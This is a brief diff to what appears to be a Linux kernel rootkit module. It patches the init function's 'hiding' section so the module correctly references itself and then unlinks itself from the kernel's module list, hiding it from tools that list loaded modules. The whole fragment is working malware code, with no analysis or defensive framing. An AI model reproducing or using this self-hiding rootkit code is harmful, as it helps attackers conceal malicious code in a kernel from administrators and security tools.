@@ -105,7 +105,7 @@ int __init m_init(void) {
 
 	/* hiding */
 	
-	struct module *m = &THIS_MODULE;
+	struct module *m = &__this_module;
 	if(m->init == m_init)
 		list_del_init(&m->list);
 	
